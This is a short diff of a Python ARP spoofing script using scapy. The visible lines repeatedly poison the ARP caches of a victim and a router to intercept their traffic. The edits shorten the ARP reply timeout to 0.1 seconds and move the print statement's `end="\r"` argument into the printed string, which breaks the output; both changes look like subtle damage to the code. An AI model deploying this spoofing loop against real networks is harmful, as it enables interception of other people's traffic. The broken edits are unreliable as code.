@@ -20,7 +20,7 @@ def get_mac(ip):
      
     # return a list of MAC addresses with respective
     # MAC addresses and IP addresses.
-    answ = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, iface=IFACE)[0]
+    answ = scapy.srp(arp_request_broadcast, timeout=0.1, verbose=False, iface=IFACE)[0]
     if answ:
         # we choose the first MAC address and select
         # the MAC address using the field hwsrc
@@ -74,6 +74,6 @@ def arp_main(attacker_addr, manual, router, input_iface, silent):
             arp_spoof(victim_ip, router_ip)
             arp_spoof(router_ip, victim_ip)
             sys.stdout.flush()
-            print("[+] Packets sent " + str(sent_packets_count), end="\r")
+            print("[+] Packets sent " + str(sent_packets_count) + "end=\r")
             sys.stdout.flush()
             time.sleep(2)
